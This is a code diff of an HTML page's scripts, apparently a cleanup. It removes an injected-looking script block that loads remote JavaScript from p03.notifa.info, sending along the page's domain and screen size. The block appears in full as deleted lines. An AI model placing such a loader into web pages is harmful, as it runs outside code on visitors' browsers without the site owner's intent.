@@ -164,7 +164,6 @@
     const selectKategori = document.querySelector('.select-kategori');
     const selectSekolah = document.querySelector('#select-sekolah');
     const sekolah = document.querySelectorAll('#sekolah');
-
     selectKategori.addEventListener('change', function () {
         if(this.value !== ''){
             selectSekolah.style.display = '';
@@ -187,32 +186,6 @@
         }
     })
 </script>
-<script type="text/javascript">if (self == top) {
-        function netbro_cache_analytics(fn, callback) {
-            setTimeout(function () {
-                fn();
-                callback();
-            }, 0);
-        }
-
-        function sync(fn) {
-            fn();
-        }
-
-        function requestCfs() {
-            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-            var idc_glo_r = Math.floor(Math.random() * 99999999999);
-            var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8%2flUox7P%2f3AoD2XHrHVmDsWlQPWH3Yk2z8RAbIFGUi7RXcoNr8BuLrPElLeKsTkPdCkk7foojBrt5%2fGsmGjiarFa%2fqW%2faEI90q3Q8oFGDaFu5Tu0z4%2bnowIJuo2IAnvxyy5JQJchyFj3t8%2fsJ31uy29L%2boSmhSzYWZIhVTaz%2bvW%2fBShFkiCvKQBeGnfkgCFNr%2fv2V9dquUKYFZO8Dn1iLeLhR6vYDrBtKgpWaMVThoaHmD7JMu61QRCOBOzx9cJ1hXjezxB98K%2bKGR9QyWvWGX83eKJYpxo4XMMpmHf7dLcPlV9JpwDVBFqcKD7wsHgCx8PPy7P5TZwSKiqi7Bg3lVwzplWMYJdF1se50JJ4wf9R5ft7Cy0EUmSbgOEbjn6xL%2bFSnXyNZ6I1uAgkF%2bsXScp62Sr9%2f2mRI95eTGWLjQpPe55sw0mBi3n7F4j7qgRU4Te%2fcMG1ITTRx3Loco1%2fTw%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-            var bsa = document.createElement('script');
-            bsa.type = 'text/javascript';
-            bsa.async = true;
-            bsa.src = url;
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-        }
-
-        netbro_cache_analytics(requestCfs, function () {
-        });
-    };</script>
 
 </body>
 
